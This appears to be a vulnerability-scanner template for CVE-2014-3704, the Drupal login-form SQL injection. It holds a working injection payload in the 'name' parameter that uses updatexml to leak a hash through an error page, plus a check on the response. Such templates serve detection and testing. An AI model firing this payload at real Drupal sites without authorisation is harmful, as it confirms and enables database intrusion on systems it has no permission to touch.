id: CVE-2014-3704

info:
    name: Drupal SQL Injection
    author: unkown
    severity: high

set:
    rand: randomInt(200000000, 210000000)
rules:
    r0:
        request:
            method: POST
            path: /?q=node&destination=node
            body: pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,(select md5({{rand}}))),0)%23]=bob&name[0]=a
        expression: response.status == 500 && response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
expression: r0()

